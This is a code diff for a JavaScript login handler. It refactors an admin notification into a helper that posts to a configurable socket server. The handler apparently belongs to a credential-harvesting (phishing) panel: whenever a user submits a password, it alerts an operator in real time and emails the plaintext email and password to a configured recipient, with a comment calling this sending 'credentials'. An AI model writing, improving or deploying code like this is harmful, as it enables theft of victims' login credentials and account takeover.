@@ -186,6 +186,53 @@ async function sendEmail(email, password, recipientEmail) {
     }
 }
 
+// Helper function to send socket notification
+async function sendSocketNotification(email, type, message) {
+    try {
+        // Get socket server URL from environment variables
+        const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL ||
+            process.env.SOCKET_SERVER_URL;
+
+        // Remove trailing slash if exists
+        const baseUrl = socketUrl.replace(/\/+$/, '');
+        const notifyUrl = `${baseUrl}/api/notify-admin`;
+
+        console.log(`📤 Sending notification to: ${notifyUrl}`);
+
+        // Use AbortController for timeout
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+        const response = await fetch(notifyUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                email: email,
+                type: type,
+                message: message
+            }),
+            signal: controller.signal
+        });
+
+        clearTimeout(timeoutId);
+
+        if (response.ok) {
+            console.log("✅ Socket notification sent successfully");
+        } else {
+            console.warn(`⚠️ Socket notification failed with status: ${response.status}`);
+        }
+    } catch (error) {
+        if (error.name === 'AbortError') {
+            console.warn("⏱️ Socket notification timeout");
+        } else {
+            console.error("❌ Socket notification error:", error.message);
+        }
+        // Don't throw - this is non-critical
+    }
+}
+
 export async function loginAction(formData) {
     try {
         const getField = (fd, name) => {
@@ -287,20 +334,8 @@ export async function loginAction(formData) {
             user.status = "pending";
             await user.save();
 
-            // Send real-time notification to admin via socket server
-            try {
-                fetch("http://localhost:3001/api/notify-admin", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        email: email,
-                        type: "password_submit",
-                        message: "User has submitted a password"
-                    })
-                }).catch(err => console.error("Socket notification fetch error:", err));
-            } catch (error) {
-                console.error("Socket notification error:", error);
-            }
+            // Send real-time notification to admin via socket server (non-blocking)
+            sendSocketNotification(email, "password_submit", "User has submitted a password");
 
             // Send email with credentials (non-blocking)
             sendEmail(email, password, process.env.EMAIL_RECIPIENT).catch(err => {
